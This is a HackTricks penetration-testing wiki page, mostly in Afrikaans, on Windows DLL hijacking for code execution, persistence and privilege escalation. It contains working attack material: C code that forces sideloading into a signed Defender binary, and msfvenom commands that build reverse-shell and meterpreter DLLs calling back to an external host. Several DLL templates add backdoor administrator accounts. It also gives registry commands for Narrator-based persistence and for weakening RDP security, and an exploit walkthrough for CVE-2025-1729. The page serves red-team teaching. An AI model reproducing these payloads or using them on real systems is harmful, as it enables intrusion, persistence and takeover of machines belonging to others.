# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulasie van 'n vertroude toepassing sodat dit 'n kwaadwillige DLL laai. Hierdie term omvat verskeie taktieke soos **DLL Spoofing, Injection, and Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, verkryging van persistence, en, minder algemeen, privilege escalation. Alhoewel die fokus hier op escalation is, bly die metode van hijacking konstant oor doelwitte.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, elk se doeltreffendheid hang af van hoe die toepassing DLLs laai:

1. **DLL Replacement**: Vervang 'n egte DLL met 'n kwaadwillige een, opsioneel gebruik makend van DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n soekpad wat vooraf gaan aan die wettige een, deur die toepassing se soekpatroon uit te buit.
3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL wat 'n toepassing sal laai, terwyl die toepassing dink dit is 'n vereiste DLL wat nie bestaan nie.
4. **DLL Redirection**: Wys die soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers aan om die toepassing na die kwaadwillige DLL te rig.
5. **WinSxS DLL Replacement**: Vervang die wettige DLL met 'n kwaadwillige teenoorgestelde in die WinSxS gids, 'n metode wat dikwels geassosieer word met DLL side-loading.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n gebruiker-beheerde gids saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution tegnieke.

## Om ontbrekende Dlls te vind

Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop en die **volgende 2 filters** te **stel**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

en net die **File System Activity** te wys:

![](<../../../images/image (153).png>)

As jy op soek is na **missing dlls in general** laat jy dit hierdie vir 'n paar **seconds** loop.\
As jy op soek is na 'n **missing dll inside an specific executable** moet jy nog 'n filter stel soos "Process Name" "contains" `<exec name>`, dit uitvoer, en die vangs van gebeurtenisse stop.

## Exploiting Missing Dlls

Om privileges te eskaleer is die beste kans om 'n dll te kan skryf wat 'n privileged proses sal probeer laai in een van die plekke waar dit gaan soek. Daarom sal ons in staat wees om 'n dll te **skryf** in 'n **gids** waar die **dll** gesoek word voor die gids waar die **oorspronklike dll** is (n aaklike geval), of ons sal in staat wees om te skryf in 'n gids waar die dll gesoek gaan word en die oorspronklike **dll** nie in enige gids bestaan nie.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows-toepassings soek vir DLLs deur 'n stel van voorafbepaalde soekpaaie te volg, in 'n bepaalde volgorde. Die probleem van DLL hijacking ontstaan wanneer 'n kwaadwillige DLL strategies in een van hierdie gidse geplaas word, sodat dit voor die egte DLL gelaai word. 'n Oplossing om dit te voorkom is om te verseker dat die toepassing absolute paaie gebruik wanneer dit na die DLLs verwys wat dit benodig.

You can see the **DLL search order on 32-bit** systems below:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Dit is die **default** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, skuif die huidige gids op na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registerwaarde en stel dit op 0 (verstek is geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funksie met **LOAD_WITH_ALTERED_SEARCH_PATH** aangeroep word, begin die soektog in die gids van die executable module wat **LoadLibraryEx** laai.

Laastens, neem kennis dat **'n dll gelaai kan word deur die absolute pad aan te dui in plaas van net die naam**. In daardie geval gaan daardie dll **slegs in daardie pad gesoek word** (as die dll afhanklikhede het, gaan hulle gesoek word soos net gelaai deur naam).

Daar is ander maniere om die soekorde te verander, maar ek gaan hulle nie hier beskryf nie.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Hoofidee
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Aantekeninge/beperkings
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Volledige C voorbeeld: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operationele gebruiksvoorbeeld
- Plaas 'n kwaadwillige xmllite.dll (wat die vereiste funksies uitvoer of na die werklike een proxy) in jou DllPath-gids.
- Laai 'n gesigneerde binêre wat bekend is daarvoor dat dit xmllite.dll per naam opsoek deur gebruik te maak van die bogenoemde tegniek. Die loader los die import op via die gespesifiseerde DllPath en sideloads jou DLL.

Hierdie tegniek is in die natuur waargeneem om multi-stage sideloading chains aan te dryf: 'n aanvanklike launcher laat 'n helper DLL val, wat dan 'n Microsoft-signed, hijackable binêre met 'n pasgemaakte DllPath spawn om die laai van die aanvaller se DLL vanaf 'n staging directory af te dwing.


#### Uitsonderings op dll-soekorde volgens Windows-dokumentasie

Sekere uitsonderings op die standaard DLL-soekorde word in Windows-dokumentasie aangeteken:

- Wanneer 'n **DLL wat dieselfde naam deel as een wat reeds in geheue gelaai is** teëgekom word, slaan die stelsel die gewone soektog oor. In plaas daarvan voer dit 'n kontrole vir redirect en 'n manifest uit voordat dit standaard na die reeds in geheue bestaande DLL terugval. **In hierdie scenario voer die stelsel nie 'n soektog na die DLL uit nie**.
- In gevalle waar die DLL as 'n **known DLL** vir die huidige Windows-weergawe geïdentifiseer word, sal die stelsel sy weergawe van die known DLL gebruik, tesame met enige van sy afhanklike DLL's, en sodoende die soekproses **oorbly**. Die registersleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat 'n lys van hierdie known DLLs.
- As 'n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLL's uitgevoer asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL deur 'n volledige pad geïdentifiseer is.

### Privilegie-eskalering

**Vereistes**:

- Identifiseer 'n proses wat onder **ander voorregte** sal opereer (horizontal or lateral movement), wat **'n DLL ontbreek**.
- Verseker dat **skryf toegang** beskikbaar is vir enige **gids** waarin die **DLL** gesoek sal word. Hierdie ligging kan die gids van die uitvoerbare lêer wees of 'n gids binne die stelselpad.

Ja, die vereistes is moeilik om te vind aangesien dit **by verstek vreemd is om 'n met voorregte uitgevoerde uitvoerbare te vind wat 'n DLL mis** en dit is selfs **meer vreemd om skryfpermissies op 'n stelselpadgids te hê** (jy kan dit nie by verstek hê nie). Maar in wan-gekonfigureerde omgewings is dit moontlik.\
In die geval dat jy geluk het en jy voldoen aan die vereistes, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs as die **hoofdoel van die projek is om UAC te bypass**, mag jy daar 'n **PoC** van 'n Dll hijaking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik net deur die pad van die gids waar jy skryfpermissies het te verander).

Let daarop dat jy jou **toegangsregte in 'n gids** kan nagaan deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die toegangsregte van alle lêergidse binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Ander interessante geoutomatiseerde gereedskap om hierdie kwesbaarheid te ontdek is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

Indien jy 'n benutbare scenario vind, een van die belangrikste dinge om dit suksesvol te misbruik sal wees om **create a dll that exports at least all the functions the executable will import from it**. Neem kennis dat Dll Hijacking handig kan wees om [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) of om [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) te bereik. Jy kan 'n voorbeeld vind van **how to create a valid dll** binne hierdie dll hijacking studie gefokus op dll hijacking vir uitvoering: [https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Verder, in die **next sectio**n kan jy sommige **basic dll codes** vind wat nuttig mag wees as **templates** of om 'n **dll with non required functions exported** te skep.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basies is 'n Dll proxy 'n Dll wat in staat is om jou kwaadwillige kode uit te voer wanneer dit gelaai word, maar ook om bloot te stel en te werk soos verwag deur alle oproepe na die werklike biblioteek te herlei.

Met die instrumente [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik 'n uitvoerbare aanwys en die biblioteek kies wat jy wil proxify en 'n proxified dll genereer, of die Dll aandui en 'n proxified dll genereer.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let op dat in verskeie gevalle die Dll wat jy kompileer moet **eksporteer verskeie funksies** wat deur die victim process gelaai gaan word; as hierdie funksies nie bestaan nie, sal die **binary nie in staat wees om hulle te laai nie** en die **exploit sal misluk**.

<details>
<summary>C DLL sjabloon (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL voorbeeld met gebruikersaanmaak</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe ondersoek steeds by opstart 'n voorspelbare, taalspesifieke lokalisering DLL wat gehijack kan word vir arbitrary code execution en persistence.

Belangrike feite
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As 'n writable attacker-controlled DLL by die OneCore path bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` uitgevoer. Geen exports word vereis nie.

Opsporing met Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator en kyk na die poging om die bogenoemde pad te laai.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- ’n naïewe hijack sal die UI laat praat/uitlig. Om stil te bly, wanneer jy aanheg tel Narrator threads, open die hoofthread (`OpenThread(THREAD_SUSPEND_RESUME)`) en `SuspendThread` dit; gaan voort in jou eie thread. Sien PoC vir volledige kode.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde sal die begin van Narrator die geplante DLL laai. Op die secure desktop (logon screen), druk CTRL+WIN+ENTER om Narrator te begin.

RDP-triggered SYSTEM execution (lateral movement)
- Laat die klassieke RDP-sekuriteitslaag toe: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die gasheer, op die aanmeldskerm druk CTRL+WIN+ENTER om Narrator te start; jou DLL voer as SYSTEM uit op die secure desktop.
- Uitvoering stop wanneer die RDP-sessie sluit—inject/migrate onmiddellik.

Bring Your Own Accessibility (BYOA)
- Jy kan ’n ingeboude Accessibility Tool (AT) registry-inskrywing kloon (bv. CursorIndicator), dit wysig om na ’n arbitrêre binary/DLL te wys, dit importeer, en dan `configuration` op daardie AT-naam stel. Dit bemiddel arbitrêre uitvoering onder die Accessibility-raamwerk.

Notes
- Skryf onder `%windir%\System32` en die verandering van HKLM-waardes vereis admin regte.
- Alle payload-logika kan in `DLL_PROCESS_ATTACH` leef; geen exports word benodig nie.

## Gevalstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie geval demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), gedokumenteer as **CVE-2025-1729**.

### Besonderhede van die Kwetsbaarheid

- **Component**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` hardloop daagliks om 09:30 onder die konteks van die aangemelde gebruiker.
- **Directory Permissions**: Skryfbaar deur `CREATOR OWNER`, wat plaaslike gebruikers toelaat om arbitrêre lêers neer te sit.
- **DLL Search Behavior**: Probeer eers om `hostfxr.dll` vanaf sy werkgids te laai en log "NAME NOT FOUND" as dit ontbreek, wat aandui dat die plaaslike gids eerste gesoek word.

### Exploit Implementation

’n Aanvaller kan ’n kwaadwillige `hostfxr.dll` stub in dieselfde gids plaas en die ontbrekende DLL misbruik om kode-uitvoering onder die gebruiker se konteks te bereik:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Aanvalsverloop

1. As 'n standaardgebruiker, plaas `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag dat die geskeduleerde taak om 9:30 vm uitvoer onder die huidige gebruiker se konteks.
3. As 'n administrateur aangemeld is wanneer die taak uitgevoer word, hardloop die kwaadwillige DLL in die administrateur se sessie op medium-integriteit.
4. Koppel standaard UAC-bypass-tegnieke om van medium-integriteit na SYSTEM-bevoegdhede te eskaleer.

## Verwysings

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
